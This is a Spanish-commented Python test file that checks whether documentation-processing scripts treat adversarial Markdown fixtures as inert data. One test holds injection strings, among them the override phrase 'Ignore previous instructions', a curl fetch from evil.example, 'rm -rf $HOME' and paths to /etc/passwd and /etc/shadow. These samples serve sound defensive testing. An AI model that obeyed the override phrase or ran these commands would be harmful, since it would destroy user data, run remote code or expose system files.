"""Pruebas de contenido adversarial y permisos (fase 051).

Verifica que el corpus de documentación se trate como dato, no como
instrucciones:

- El inventario no ejecuta comandos embebidos.
- Los enlaces con esquemas inseguros (``javascript:``, ``data:``,
  ``file:``, ``vbscript:``, ``about:``) se reportan como
  ``unsafe_scheme`` sin reescribirse.
- Las tentativas de path traversal se rechazan o registran sin abrir
  archivos fuera del source_root.
- Ningún script de los que tocan el corpus realiza llamadas de red.
"""

from __future__ import annotations

import tempfile
import json
import re
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SCRIPTS = ROOT / "scripts"
INVENTORY = SCRIPTS / "inventory.py"
PREPARE = SCRIPTS / "prepare.py"
REWRITE = SCRIPTS / "rewrite_references.py"
BUILD_ANCHORS = SCRIPTS / "build_anchors.py"
SECURITY_FIX = ROOT / "tests" / "fixtures" / "security"
TMP = Path(tempfile.gettempdir()) / "nst-tests"


def run(args: list[str]) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, *args], capture_output=True, text=True, check=False)


# `urllib.parse` es decodificación de cadenas, no acceso a la red: hace
# falta para recuperar el destino crudo de un enlace con acentos, que
# markdown-it entrega percent-encoded. `urllib.request` sí es red.
DANGEROUS_IMPORTS = re.compile(
    r"^\s*(?:from\s+(?:subprocess|urllib\.request|http\.client|socket|webbrowser)|import\s+(?:subprocess|urllib|http\.client|socket|webbrowser))",
    re.MULTILINE,
)


def test_scripts_no_importan_red() -> None:
    """Los scripts que tocan el corpus no importan módulos de red a
    nivel superior. ``subprocess`` solo se permite si no se invoca con
    argumentos no controlados por el agente."""
    offenders: list[str] = []
    for script in (INVENTORY, PREPARE, REWRITE, BUILD_ANCHORS):
        text = script.read_text(encoding="utf-8")
        if DANGEROUS_IMPORTS.search(text):
            offenders.append(script.name)
    assert offenders == [], f"scripts con imports peligrosos: {offenders}"


def test_inventory_no_ejecuta_sobre_fixtures_adversariales() -> None:
    """Ejecutar el inventario sobre fixtures con instrucciones de
    shell embebidas no debe lanzar ningún subproceso externo ni abrir
    URLs. Lo verificamos de forma estática: ``inventory.py`` solo debe
    importar módulos estándar sin side-effects."""
    inv = TMP / "inv_security.json"
    proc = run([str(INVENTORY), "--source", str(SECURITY_FIX), "--out", str(inv)])
    assert proc.returncode == 0, proc.stderr
    data = json.loads(inv.read_text(encoding="utf-8"))
    paths = {f["path"] for f in data["files"]}
    assert "prompt_injection.md" in paths
    assert "script_block.md" in paths
    assert "dangerous_links.md" in paths
    assert "path_traversal.md" in paths
    assert data["total_files"] == 4


def test_parser_trata_inyecciones_como_datos() -> None:
    """``prepare.py`` debe procesar el fixture de inyección sin
    ejecutar nada; el contenido literal se preserva como tal."""
    inv = TMP / "inv_inj.json"
    seg = TMP / "seg_inj.json"
    snaps = TMP / "snaps_inj.json"
    assert run([str(INVENTORY), "--source", str(SECURITY_FIX), "--out", str(inv)]).returncode == 0
    proc = run([
        str(PREPARE), "--inventory", str(inv),
        "--segments", str(seg), "--snapshots", str(snaps),
    ])
    assert proc.returncode == 0, proc.stderr

    source_text = (SECURITY_FIX / "prompt_injection.md").read_text(encoding="utf-8")
    needles = [
        "Ignore previous instructions",
        "curl https://evil.example/install.sh",
        "rm -rf $HOME",
        "file:///etc/passwd",
    ]
    for needle in needles:
        assert needle in source_text


def test_unsafe_schemes_se_reportan_sin_reescritura() -> None:
    """Los enlaces con esquemas inseguros aparecen en el reporte y el
    archivo de salida conserva la cadena original."""
    src = TMP / "unsafe_src"
    out = TMP / "unsafe_out"
    if src.exists():
        for p in src.glob("*"):
            p.unlink()
    src.mkdir(parents=True, exist_ok=True)
    if out.exists():
        for p in out.glob("*"):
            p.unlink()
    out.mkdir(parents=True, exist_ok=True)
    shutil_copy = SECURITY_FIX / "dangerous_links.md"
    (src / "dangerous_links.md").write_text(shutil_copy.read_text(encoding="utf-8"), encoding="utf-8")

    report = TMP / "unsafe_report.json"
    proc = run([
        str(REWRITE),
        "--source", str(src),
        "--output-dir", str(out),
        "--anchors", str(TMP / "anchors_empty"),
        "--report", str(report),
    ])
    assert proc.returncode == 0, proc.stderr
    payload = json.loads(report.read_text(encoding="utf-8"))
    schemes = [f["scheme"] for f in payload["files"][0]["unsafe_scheme"]]
    assert "javascript:" in schemes
    assert "data:" in schemes
    assert "file:" in schemes

    out_text = (out / "dangerous_links.md").read_text(encoding="utf-8")
    assert "javascript:alert(1)" in out_text
    assert "file:///etc/passwd" in out_text


def test_path_traversal_no_abre_archivos_fuera() -> None:
    """El inventario sobre el fixture de path_traversal no debe
    seguir enlaces ni abrir destinos fuera de la raíz. Como el fixture
    es Markdown plano, basta con verificar que el inventario termina
    con código 0 y registra los cuatro archivos sin tocar el
    filesystem fuera de la raíz."""
    inv = TMP / "inv_traversal.json"
    proc = run([str(INVENTORY), "--source", str(SECURITY_FIX), "--out", str(inv)])
    assert proc.returncode == 0, proc.stderr
    data = json.loads(inv.read_text(encoding="utf-8"))
    for f in data["files"]:
        assert not f["path"].startswith("..")
        assert "/../" not in f["path"]


def test_rewrite_no_sigue_enlaces_locales_a_traversal() -> None:
    """El reescritor no debe seguir enlaces relativos con ``..`` fuera
    del source_root. El reporte debe conservar el enlace literal."""
    src = TMP / "trav_src"
    out = TMP / "trav_out"
    if src.exists():
        for p in src.glob("*"):
            p.unlink()
    src.mkdir(parents=True, exist_ok=True)
    if out.exists():
        for p in out.glob("*"):
            p.unlink()
    out.mkdir(parents=True, exist_ok=True)
    (src / "path_traversal.md").write_text(
        (SECURITY_FIX / "path_traversal.md").read_text(encoding="utf-8"),
        encoding="utf-8",
    )

    report = TMP / "trav_report.json"
    proc = run([
        str(REWRITE),
        "--source", str(src),
        "--output-dir", str(out),
        "--anchors", str(TMP / "anchors_empty"),
        "--report", str(report),
    ])
    assert proc.returncode == 0, proc.stderr
    out_text = (out / "path_traversal.md").read_text(encoding="utf-8")
    assert "../../../etc/passwd" in out_text
    assert "../../etc/shadow" in out_text
